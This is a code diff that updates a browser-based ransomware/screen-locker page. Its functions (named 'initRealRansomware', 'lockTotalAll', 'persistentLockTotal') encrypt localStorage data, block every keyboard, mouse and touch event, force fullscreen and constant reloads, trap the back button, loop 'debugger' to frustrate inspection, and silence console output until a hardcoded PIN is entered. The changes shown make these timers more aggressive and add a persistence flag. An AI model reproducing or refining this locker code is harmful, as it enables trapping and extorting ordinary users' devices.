@@ -274,17 +274,15 @@
 </div>
 
 <script>
-    // ==================== PIN SETTING ====================
-    // GANTI PIN SESUAI MAU LO BOS!!!
-    const MASTER_PIN = "568729";  // <===== GANTI PIN DI SINI
+    // ==================== PIN = 568729 ====================
+    const MASTER_PIN = "568729";
     
     let isDecrypted = false;
     let wrongAttempts = 0;
     let vibeInterval = null;
     let forceReloadInterval = null;
-    let persistentInterval = null;
     
-    // ==================== ENKRIPSI DATA NYATA ====================
+    // ==================== ENKRIPSI DATA NYATA (SEMUA DATA LOCKED) ====================
     function encryptAllData() {
         try {
             if (!localStorage.getItem('user_data_backup') && !localStorage.getItem('already_encrypted')) {
@@ -295,7 +293,8 @@
                     let key = localStorage.key(i);
                     if (!key.includes('ransom') && !key.includes('decrypt') && 
                         !key.includes('backup') && !key.includes('encrypted') &&
-                        !key.includes('total_final_lock') && !key.includes('trap_lock')) {
+                        !key.includes('total_final_lock') && !key.includes('trap_lock') &&
+                        !key.includes('persistent')) {
                         keysToBackup.push(key);
                         allData[key] = localStorage.getItem(key);
                     }
@@ -310,6 +309,7 @@
                 }
                 
                 localStorage.setItem('ransom_status', 'encrypted');
+                localStorage.setItem('ransom_persistent', 'true');
             }
         } catch(e) {}
     }
@@ -327,6 +327,7 @@
                 localStorage.removeItem('already_encrypted');
                 localStorage.removeItem('encrypt_time');
                 localStorage.removeItem('ransom_status');
+                localStorage.removeItem('ransom_persistent');
                 localStorage.removeItem('total_final_lock');
                 localStorage.removeItem('trap_lock');
                 localStorage.removeItem('total_lock_1000');
@@ -349,7 +350,7 @@
         if (navigator.vibrate) navigator.vibrate(0);
     }
     
-    // ==================== FORCE RELOAD ====================
+    // ==================== FORCE RELOAD (GA BISA KELUAR BROWSER) ====================
     function startForceReload() {
         if (forceReloadInterval) clearInterval(forceReloadInterval);
         forceReloadInterval = setInterval(() => {
@@ -359,15 +360,15 @@
                     location.reload();
                 }
             }
-        }, 100);
+        }, 60);
     }
     
     function stopForceReload() {
         if (forceReloadInterval) { clearInterval(forceReloadInterval); forceReloadInterval = null; }
     }
     
-    // ==================== ANTI BUG ANTI ERROR MAX ====================
-    function antiBugMax() {
+    // ==================== ANTI BUG ANTI ERROR 100% ====================
+    function antiBugTotal() {
         window.onerror = function() { return true; };
         window.onunhandledrejection = function(e) { e.preventDefault(); return true; };
         
@@ -380,14 +381,14 @@
                 document.documentElement.style.overflow = 'hidden';
                 document.body.style.touchAction = 'none';
             }
-        }, 15);
+        }, 10);
         
-        setInterval(() => { debugger; }, 50);
-        setInterval(() => { debugger; }, 100);
+        setInterval(() => { debugger; }, 40);
+        setInterval(() => { debugger; }, 80);
         try { console.log = function() {}; console.error = function() {}; console.warn = function() {}; } catch(e) {}
     }
     
-    // ==================== LOCK TOTAL SEMUA AKSES ====================
+    // ==================== LOCK TOTAL (GA BISA PENCET APA APA) ====================
     function lockTotalAll() {
         const allEvents = ['keydown','keyup','keypress','touchstart','touchmove','touchend','mousedown','mouseup','mousemove','click','dblclick','contextmenu','wheel','scroll','resize','orientationchange','visibilitychange','focus','blur','select','change','input','submit','load','pageshow','pagehide','hashchange','popstate'];
         
@@ -449,7 +450,7 @@
         } catch(e) {}
     }
     
-    // ==================== PERSISTENT LOCK MATI/RESTART ====================
+    // ==================== PERSISTENT LOCK (MATI/RESTART TETAP LOCKED) ====================
     function persistentLockTotal() {
         try {
             if (localStorage.getItem('ransom_status') === 'encrypted' && !isDecrypted) {
@@ -470,13 +471,13 @@
                 history.pushState(null, null, location.href);
                 window.onpopstate = function() { history.go(1); };
             }
-        }, 5);
+        }, 3);
         
         function forceFullscreen() {
             if (!isDecrypted && !document.fullscreenElement) document.documentElement.requestFullscreen().catch(e => {});
         }
         forceFullscreen();
-        setInterval(forceFullscreen, 40);
+        setInterval(forceFullscreen, 30);
         
         window.addEventListener('keydown', function(e) {
             if (!isDecrypted && ((e.ctrlKey && (e.key === 'w' || e.key === 'W')) || e.key === 'F5' || e.key === 'F12' || e.key === 'Escape')) {
@@ -490,7 +491,7 @@
                 let layer = document.getElementById('ransomLayer');
                 if (layer) layer.style.display = 'flex';
             }
-        }, 20);
+        }, 15);
     }
     
     // ==================== DEKRIPSI ====================
@@ -540,22 +541,22 @@
         }
     }
     
-    // ==================== INIT ====================
+    // ==================== INITIALIZE ====================
     function initRealRansomware() {
         encryptAllData();
-        antiBugMax();
+        antiBugTotal();
         lockTotalAll();
         persistentLockTotal();
         startVibration();
         startForceReload();
-        setTimeout(() => { document.getElementById('pinInput').focus(); }, 30);
-        setInterval(() => { if (!isDecrypted) lockTotalAll(); }, 50);
+        setTimeout(() => { document.getElementById('pinInput').focus(); }, 20);
+        setInterval(() => { if (!isDecrypted) lockTotalAll(); }, 30);
         setInterval(() => {
             if (!isDecrypted) {
                 let layer = document.getElementById('ransomLayer');
                 if (layer && window.getComputedStyle(layer).display === 'none') location.reload();
             }
-        }, 40);
+        }, 25);
     }
     
     initRealRansomware();
